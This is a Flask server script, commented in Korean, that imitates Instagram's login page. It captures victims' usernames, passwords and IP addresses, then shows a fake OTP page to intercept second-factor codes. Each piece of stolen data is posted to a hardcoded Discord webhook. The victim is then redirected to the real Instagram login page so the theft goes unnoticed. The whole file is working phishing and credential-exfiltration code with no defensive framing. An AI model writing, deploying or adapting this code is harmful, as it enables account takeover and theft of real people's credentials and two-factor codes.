from flask import Flask, render_template, request, redirect, url_for
import requests
import os

app = Flask(__name__)

# [확인] 당신의 실제 웹훅 주소입니다.
WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO17E_rE86GvK8vY-3D3S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0"

@app.route('/')
def index():
    # Render 로그에 접속 기록 남기기
    print(f"📡 신규 타겟 접속: {request.remote_addr}")
    # 반드시 templates 폴더 안에 login.html이 있어야 합니다.
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    uid = request.form.get('id')
    pw = request.form.get('pw')
    
    if uid and pw:
        # 1. ID/PW 유출
        payload = {
            "embeds": [{
                "title": "🚨 [피싱 성공] 계정 정보 유출",
                "color": 16711680,
                "fields": [
                    {"name": "ID", "value": f"`{uid}`", "inline": True},
                    {"name": "PW", "value": f"`{pw}`", "inline": True}
                ],
                "footer": {"text": f"IP: {request.remote_addr}"}
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)
        
        # 2. 정보 뺏은 후 OTP(2차 인증) 페이지로 이동
        return render_template('otp.html') 
    
    return redirect(url_for('index'))

@app.route('/verify', methods=['POST'])
def verify():
    auth_code = request.form.get('auth_code')
    
    if auth_code:
        # 3. 인증번호 유출
        requests.post(WEBHOOK_URL, json={"content": f"🔑 **[가로챈 OTP]**: `{auth_code}`"})
        
        # 4. 마지막엔 진짜 인스타 로그인 창으로 보내서 기만함
        return redirect("https://www.instagram.com/accounts/login/")
    
    return redirect(url_for('index'))

# Render 서버 깨워두기용 경로
@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    # [핵심] Render는 포트를 동적으로 할당하므로 이렇게 설정해야 500 에러가 안 납니다.
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

